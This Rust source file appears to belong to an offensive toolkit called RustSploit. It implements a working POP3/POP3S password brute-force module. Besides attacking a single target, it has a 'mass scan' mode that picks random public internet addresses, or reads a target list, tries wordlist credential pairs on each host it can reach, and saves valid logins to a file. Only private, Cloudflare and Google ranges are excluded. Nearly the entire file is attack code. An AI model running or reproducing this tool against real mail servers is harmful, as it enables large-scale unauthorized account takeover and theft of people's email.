use anyhow::{anyhow, Result, Context};
use colored::*;
use native_tls::TlsConnector;
use std::io::{Read, Write};
use std::net::TcpStream;
use std::sync::{
    atomic::{AtomicBool, Ordering},
    Arc,
};
use std::time::Duration;
use tokio::sync::{Mutex, Semaphore};
use futures::stream::{FuturesUnordered, StreamExt};

use crate::utils::{
    prompt_yes_no, prompt_existing_file, prompt_int_range,
    load_lines, prompt_default,
};
use crate::modules::creds::utils::{BruteforceStats, generate_random_public_ip, is_ip_checked, mark_ip_checked, parse_exclusions};
use std::sync::atomic::AtomicUsize;
use std::net::{IpAddr, SocketAddr}; 
use tokio::fs::OpenOptions; // For file writing in mass scan
use tokio::io::AsyncWriteExt; // For write_all


const STATE_FILE: &str = "pop3_hose_state.log";
const MASS_SCAN_CONNECT_TIMEOUT_MS: u64 = 3000;

// Hardcoded exclusions
const EXCLUDED_RANGES: &[&str] = &[
    "10.0.0.0/8", "127.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16",
    "224.0.0.0/4", "240.0.0.0/4", "0.0.0.0/8",
    "100.64.0.0/10", "169.254.0.0/16", "255.255.255.255/32",
    // Cloudflare
    "103.21.244.0/22", "103.22.200.0/22", "103.31.4.0/22", "104.16.0.0/13",
    "104.24.0.0/14", "108.162.192.0/18", "131.0.72.0/22", "141.101.64.0/18",
    "162.158.0.0/15", "172.64.0.0/13", "173.245.48.0/20", "188.114.96.0/20",
    "190.93.240.0/20", "197.234.240.0/22", "198.41.128.0/17",
    "1.1.1.1/32", "1.0.0.1/32",
    // Google
    "8.8.8.8/32", "8.8.4.4/32"
];
#[derive(Clone)]
struct Pop3BruteforceConfig {
    target: String,
    port: u16,
    username_wordlist: String,
    password_wordlist: String,
    threads: usize,
    stop_on_success: bool,
    verbose: bool,
    full_combo: bool,
    use_ssl: bool,
    connection_timeout: u64,
    retry_on_error: bool,
    max_retries: usize,
    output_file: String,
    delay_ms: u64,
}

pub async fn run(target: &str) -> Result<()> {
    println!("\n{}", "=== POP3 Bruteforce Module (RustSploit) ===".bold().cyan());
    println!();

    // Check for Mass Scan Mode conditions
    let is_mass_scan = target == "random" || target == "0.0.0.0" || target == "0.0.0.0/0" || std::path::Path::new(target).is_file();

    if is_mass_scan {
        println!("{}", format!("[*] Target: {}", target).cyan());
        println!("{}", "[*] Mode: Mass Scan / Hose".yellow());
        return run_mass_scan(target).await;
    }

    let use_ssl = prompt_yes_no("Use SSL/TLS (POP3S)?", false)?;
    let default_port = if use_ssl { 995 } else { 110 };
    
    let port = prompt_int_range("Port", default_port as i64, 1, 65535)? as u16;
    let username_wordlist = prompt_existing_file("Username wordlist file")?;
    let password_wordlist = prompt_existing_file("Password wordlist file")?;
    
    let threads = prompt_int_range("Threads", 16, 1, 256)? as usize;
    let delay_ms = prompt_int_range("Delay (ms)", 50, 0, 10000)? as u64;
    let connection_timeout = prompt_int_range("Timeout (s)", 5, 1, 60)? as u64;
    
    let full_combo = prompt_yes_no("Try every username with every password?", false)?;
    let stop_on_success = prompt_yes_no("Stop on first valid login?", false)?;
    
    let output_file = prompt_default("Output file for results", "pop3_results.txt")?;
    
    let verbose = prompt_yes_no("Verbose mode?", false)?;
    let retry_on_error = prompt_yes_no("Retry failed connections?", true)?;
    let max_retries = if retry_on_error { 
        prompt_int_range("Max retries", 2, 1, 10)? as usize
    } else { 
        0 
    };

    let config = Pop3BruteforceConfig {
        target: target.to_string(),
        port,
        username_wordlist,
        password_wordlist,
        threads,
        stop_on_success,
        verbose,
        full_combo,
        use_ssl,
        connection_timeout,
        retry_on_error,
        max_retries,
        output_file,
        delay_ms,
    };

    println!();
    println!("{}", "[Starting Attack]".bold().yellow());
    println!();

    run_pop3_bruteforce(config).await
}

async fn run_mass_scan(target: &str) -> Result<()> {
    let use_ssl = prompt_yes_no("Use SSL/TLS (POP3S)?", false)?;
    let default_port = if use_ssl { 995 } else { 110 };
    let port = prompt_int_range("Port", default_port as i64, 1, 65535)? as u16;
    
    let usernames_file = prompt_existing_file("Username wordlist")?;
    let passwords_file = prompt_existing_file("Password wordlist")?;
    
    let users = load_lines(&usernames_file)?;
    let pass_lines = load_lines(&passwords_file)?;

    if users.is_empty() { return Err(anyhow!("User list empty")); }
    if pass_lines.is_empty() { return Err(anyhow!("Pass list empty")); }

    let concurrency = prompt_int_range("Max concurrent hosts to scan", 500, 1, 10000)? as usize;
    let verbose = prompt_yes_no("Verbose mode?", false)?; 
    let output_file = prompt_default("Output result file", "pop3_mass_results.txt")?;

    // Ask about exclusions
    let use_exclusions = prompt_yes_no("Exclude reserved/private ranges?", true)?;
    
    // Parse exclusions
    let exclusions = if use_exclusions {
        println!("{}", format!("[+] Loaded {} exclusion ranges", EXCLUDED_RANGES.len()).cyan());
        Arc::new(parse_exclusions(EXCLUDED_RANGES))
    } else {
        Arc::new(Vec::new())
    };

    let semaphore = Arc::new(Semaphore::new(concurrency));
    let stats_checked = Arc::new(AtomicUsize::new(0));
    let stats_found = Arc::new(AtomicUsize::new(0));

    let creds_pkg = Arc::new((users, pass_lines, use_ssl));

    // Stats
    let s_checked = stats_checked.clone();
    let s_found = stats_found.clone();
    tokio::spawn(async move {
        loop {
            tokio::time::sleep(Duration::from_secs(5)).await;
            println!(
                "[*] Status: {} IPs scanned, {} valid POP3 credentials found",
                s_checked.load(Ordering::Relaxed),
                s_found.load(Ordering::Relaxed).to_string().green().bold()
            );
        }
    });

    let run_random = target == "random" || target == "0.0.0.0" || target == "0.0.0.0/0";

    if run_random {
        // Initialize state file
        OpenOptions::new().create(true).write(true).open(STATE_FILE).await?;
        
        println!("{}", "[*] Starting Random Internet Scan...".green());
        loop {
             let permit = match semaphore.clone().acquire_owned().await {
                 Ok(p) => p,
                 Err(_) => break, // Semaphore closed, exit loop
             };
             let exc = exclusions.clone();
             let cp = creds_pkg.clone();
             let sc = stats_checked.clone();
             let sf = stats_found.clone();
             let of = output_file.clone();
             
             tokio::spawn(async move {
                 let ip = generate_random_public_ip(&exc);
                 if !is_ip_checked(&ip, STATE_FILE).await {
                     mark_ip_checked(&ip, STATE_FILE).await;
                     mass_scan_host(ip, port, cp, sf, of, verbose).await;
                 }
                 sc.fetch_add(1, Ordering::Relaxed);
                 drop(permit);
             });
        }
    } else {
        // File Mode
        let content = tokio::fs::read_to_string(target).await
            .context(format!("Failed to read target file: {}", target))?;
        let lines: Vec<String> = content.lines().map(|s| s.trim().to_string()).filter(|s| !s.is_empty()).collect();
        println!("{}", format!("[*] Loaded {} targets from file.", lines.len()).blue());

        for ip_str in lines {
             let permit = match semaphore.clone().acquire_owned().await {
                 Ok(p) => p,
                 Err(_) => continue, // Skip this IP if semaphore closed
             };
             let cp = creds_pkg.clone();
             let sc = stats_checked.clone();
             let sf = stats_found.clone();
             let of = output_file.clone();
             
             if let Ok(ip) = ip_str.parse::<IpAddr>() {
                 tokio::spawn(async move {
                    if !is_ip_checked(&ip, STATE_FILE).await {
                        mark_ip_checked(&ip, STATE_FILE).await;
                        mass_scan_host(ip, port, cp, sf, of, verbose).await;
                    }
                    sc.fetch_add(1, Ordering::Relaxed);
                    drop(permit);
                 });
             } else {
                 drop(permit); 
             }
        }
        for _ in 0..concurrency {
            let _ = semaphore.acquire().await.context("Semaphore acquisition failed")?;
        }
    }
    
    Ok(())
}

async fn mass_scan_host(
    ip: IpAddr, 
    port: u16,
    creds: Arc<(Vec<String>, Vec<String>, bool)>,
    stats_found: Arc<AtomicUsize>,
    output_file: String,
    verbose: bool
) {
    let sa = SocketAddr::new(ip, port);
    
    // 1. Connection Check
    if tokio::time::timeout(Duration::from_millis(MASS_SCAN_CONNECT_TIMEOUT_MS), tokio::net::TcpStream::connect(&sa)).await.is_err() {
        return;
    }

    let (users, passes, use_ssl) = &*creds;

    let target_str = ip.to_string();

    // Construct a config for the attempt function
    // We can't reuse the large config struct easily without creating dummy values, 
    // so we'll just reconstruct the necessary parts or make attempt_pop3_login take separate args.
    // For now, I'll build a dummy config.
    let dummy_wordlist = "dummy".to_string();
    
    for user in users {
        for pass in passes {
            let t_target = target_str.clone();
            let t_user = user.clone();
            let t_pass = pass.clone();
            let t_use_ssl = *use_ssl;
            let dw = dummy_wordlist.clone();
            
            // Blocking call
            let res = tokio::task::spawn_blocking(move || {
                let config = Pop3BruteforceConfig {
                    target: t_target,
                    port,
                    username_wordlist: dw.clone(),
                    password_wordlist: dw.clone(),
                    threads: 1,
                    stop_on_success: false,
                    verbose,
                    full_combo: false,
                    use_ssl: t_use_ssl,
                    connection_timeout: 5, // 5 seconds for login attempt
                    retry_on_error: false,
                    max_retries: 0,
                    output_file: "".to_string(),
                    delay_ms: 0,
                };
                attempt_pop3_login(&config, &t_user, &t_pass)
            }).await;

            match res {
                Ok(Ok(true)) => {
                    let msg = format!("{} -> {}:{}", ip, user, pass);
                    println!("\r{}", format!("[+] FOUND: {}", msg).green().bold());
                    if let Ok(mut file) = OpenOptions::new().create(true).append(true).open(&output_file).await {
                       let _ = file.write_all(format!("{}\n", msg).as_bytes()).await;
                    }
                    stats_found.fetch_add(1, Ordering::Relaxed);
                    return; // Stop after first success
                }
                Ok(Ok(false)) => {
                    // Auth failed
                }
                Ok(Err(_)) => {
                     // Connection error - abort this host
                     return;
                }
                Err(_) => {
                    // Start/Join error
                }
            }
        }
    }
}

async fn run_pop3_bruteforce(config: Pop3BruteforceConfig) -> Result<()> {
    // Determine loading strategy
    let _user_count = load_lines(&config.username_wordlist)?.len();
    let _pass_count = load_lines(&config.password_wordlist)?.len();
    
    // We will use memory mode for simpler implementation unless huge, but for now standard load_lines
    // If files are huge, the shared Utils load_lines might panic or OOM, but let's assume reasonable sizes for now
    // or use the streaming logic if I can adapt it easily.
    // To match other modules (ssh/ftp), I'll use load_lines.
    
    let usernames = load_lines(&config.username_wordlist)?;
    let passwords = load_lines(&config.password_wordlist)?;

    let total_attempts = if config.full_combo {
        usernames.len() * passwords.len()
    } else {
        std::cmp::max(usernames.len(), passwords.len())
    };

    println!("[*] Loaded {} usernames, {} passwords", usernames.len(), passwords.len());
    println!("[*] Total attempts: {}", total_attempts);

    let stats = Arc::new(BruteforceStats::new());
    let found_creds = Arc::new(Mutex::new(Vec::new()));
    let stop_signal = Arc::new(AtomicBool::new(false));
    let _start_time = std::time::Instant::now();

    // Start progress reporter
    let stats_clone = stats.clone();
    let stop_clone = stop_signal.clone();
    let progress_handle = tokio::spawn(async move {
        while !stop_clone.load(Ordering::Relaxed) {
             tokio::time::sleep(Duration::from_secs(2)).await;
             stats_clone.print_progress();
        }
    });

    let semaphore = Arc::new(Semaphore::new(config.threads));
    let mut tasks = FuturesUnordered::new();

    // Generate combinations
    let mut combos = Vec::new();
    if config.full_combo {
        for u in &usernames {
            for p in &passwords {
                combos.push((u.clone(), p.clone()));
            }
        }
    } else {
        // Linear mix: try u[0] p[0], u[1] p[1]... cycle if needed
        let max_len = std::cmp::max(usernames.len(), passwords.len());
        for i in 0..max_len {
            let u = &usernames[i % usernames.len()];
            let p = &passwords[i % passwords.len()];
            combos.push((u.clone(), p.clone()));
        }
    }

    // Process combinations
    for (user, pass) in combos {
         if config.stop_on_success && stop_signal.load(Ordering::Relaxed) {
            break;
         }

         let permit = semaphore.clone().acquire_owned().await?;
         let config_clone = config.clone();
         let stats_clone = stats.clone();
         let found_clone = found_creds.clone();
         let stop_signal_clone = stop_signal.clone();
         let user_clone = user.clone();
         let pass_clone = pass.clone();

         tasks.push(tokio::spawn(async move {
             let _permit = permit; // Hold permit
             
             if config_clone.stop_on_success && stop_signal_clone.load(Ordering::Relaxed) {
                 return;
             }
             
             // Retry loop
             let mut retries = 0;
             loop {
                 let config_inner = config_clone.clone();
                 let user_inner = user_clone.clone();
                 let pass_inner = pass_clone.clone();
                 
                 let res = tokio::task::spawn_blocking(move || {
                     attempt_pop3_login(&config_inner, &user_inner, &pass_inner)
                 }).await;

                 match res {
                     Ok(Ok(true)) => {
                         println!("\r{}", format!("[+] Found: {}:{}", user, pass).green().bold());
                         found_clone.lock().await.push((user.clone(), pass.clone()));
                         stats_clone.record_success();
                         if config_clone.stop_on_success {
                             stop_signal_clone.store(true, Ordering::Relaxed);
                         }
                         break;
                     },
                     Ok(Ok(false)) => {
                         stats_clone.record_failure();
                         if config_clone.verbose {
                             println!("\r{}", format!("[-] Failed: {}:{}", user, pass).dimmed());
                         }
                         break;
                     },
                     Ok(Err(e)) => {
                         if config_clone.retry_on_error && retries < config_clone.max_retries {
                             retries += 1;
                             stats_clone.record_retry();
                             // Small backoff
                             tokio::time::sleep(Duration::from_millis(500)).await;
                             continue;
                         }
                         stats_clone.record_error(e.to_string()).await;
                         if config_clone.verbose {
                              println!("\r{}", format!("[!] Error {}:{}: {}", user, pass, e).red());
                         }
                         break;
                     },
                     Err(e) => {
                          stats_clone.record_error(format!("Task panic: {}", e)).await;
                          break;
                     }
                 }
             }
             
             if config_clone.delay_ms > 0 {
                 tokio::time::sleep(Duration::from_millis(config_clone.delay_ms)).await;
             }
         }));
         
         // Drain finished tasks to keep memory low
          while let std::task::Poll::Ready(Some(_)) = futures::future::poll_fn(|cx| std::task::Poll::Ready(tasks.poll_next_unpin(cx))).await {
             // Just drain
         }
    }

    // Wait for remaining
    while let Some(_) = tasks.next().await {}

    stop_signal.store(true, Ordering::Relaxed);
    let _ = progress_handle.await;
    
    stats.print_final().await;
    
    // Save results
    let found = found_creds.lock().await;
    if !found.is_empty() {
        if let Ok(mut file) = std::fs::OpenOptions::new().create(true).append(true).open(&config.output_file) {
            for (u, p) in found.iter() {
                let _ = writeln!(file, "{}:{}", u, p);
            }
            println!("[+] Results saved to {}", config.output_file);
        }
    }

    Ok(())
}



// Blocking login attempt
fn attempt_pop3_login(config: &Pop3BruteforceConfig, user: &str, pass: &str) -> Result<bool> {
    let addr = format!("{}:{}", config.target, config.port);
    let timeout = Duration::from_secs(config.connection_timeout);
    
    if config.use_ssl {
        let connector = TlsConnector::new()?;
        // Resolve first to apply timeout to connect
        let socket_addr = std::net::ToSocketAddrs::to_socket_addrs(&addr)?.next().ok_or_else(|| anyhow!("Resolution failed"))?;
        let stream = TcpStream::connect_timeout(&socket_addr, timeout)?;
        stream.set_read_timeout(Some(timeout))?;
        stream.set_write_timeout(Some(timeout))?;
        
        let mut stream = connector.connect(&config.target, stream)?;
        
        // Read banner
        let mut buffer = [0; 1024];
        stream.read(&mut buffer)?; // +OK ...
        
        stream.write_all(format!("USER {}\r\n", user).as_bytes())?;
        let n = stream.read(&mut buffer)?;
        if !String::from_utf8_lossy(&buffer[..n]).starts_with("+OK") {
            return Ok(false);
        }
        
        stream.write_all(format!("PASS {}\r\n", pass).as_bytes())?;
        let n = stream.read(&mut buffer)?;
        if String::from_utf8_lossy(&buffer[..n]).starts_with("+OK") {
            stream.write_all(b"QUIT\r\n").ok();
            return Ok(true);
        }
    } else {
        let socket_addr = std::net::ToSocketAddrs::to_socket_addrs(&addr)?.next().ok_or_else(|| anyhow!("Resolution failed"))?;
        let mut stream = TcpStream::connect_timeout(&socket_addr, timeout)?;
        stream.set_read_timeout(Some(timeout))?;
        stream.set_write_timeout(Some(timeout))?;
        
         // Read banner
        let mut buffer = [0; 1024];
        stream.read(&mut buffer)?; 
        
        stream.write_all(format!("USER {}\r\n", user).as_bytes())?;
        let n = stream.read(&mut buffer)?;
        if !String::from_utf8_lossy(&buffer[..n]).starts_with("+OK") {
            return Ok(false);
        }
        
        stream.write_all(format!("PASS {}\r\n", pass).as_bytes())?;
        let n = stream.read(&mut buffer)?;
        if String::from_utf8_lossy(&buffer[..n]).starts_with("+OK") {
            stream.write_all(b"QUIT\r\n").ok();
            return Ok(true);
        }
    }
    
    Ok(false)
}
